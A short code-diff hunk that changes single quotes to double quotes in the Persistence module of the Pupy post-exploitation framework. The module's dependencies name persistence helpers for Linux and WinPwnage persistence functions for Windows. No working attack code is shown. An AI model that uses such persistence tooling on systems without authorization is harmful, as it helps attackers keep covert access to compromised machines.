@@ -27,13 +27,13 @@ import pupygen
 __class_name__ = "Persistence"
 
 
-@config(cat="manage", compat=['linux', 'windows'])
+@config(cat="manage", compat=["linux", "windows"])
 class Persistence(PupyModule):
     """ Enable / Disable persistence """
 
     dependencies = {
-        'linux': ['persistence'],
-        'windows': ['winpwnage.core', 'winpwnage.functions.persist']
+        "linux": ['persistence'],
+        "windows": ['winpwnage.core', 'winpwnage.functions.persist']
     }
 
     @classmethod
